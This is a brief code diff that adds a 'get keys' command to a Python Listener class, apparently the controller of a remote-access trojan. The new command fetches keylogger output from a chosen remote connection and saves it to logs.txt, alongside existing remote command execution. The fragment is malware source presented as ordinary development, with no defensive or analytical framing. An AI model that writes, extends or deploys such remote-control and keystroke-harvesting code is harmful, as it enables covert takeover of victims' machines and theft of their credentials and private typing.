@@ -208,6 +208,11 @@ class Listener:
 					print(colored(result, "green"))
 
 
+			elif command == "get keys":
+				res = self.execute_remotely(command)
+				self.write_file("logs.txt", res)
+
+
 			elif len(command.split()):
 				if self.chosen_connection:
 					result = self.execute_remotely(command)
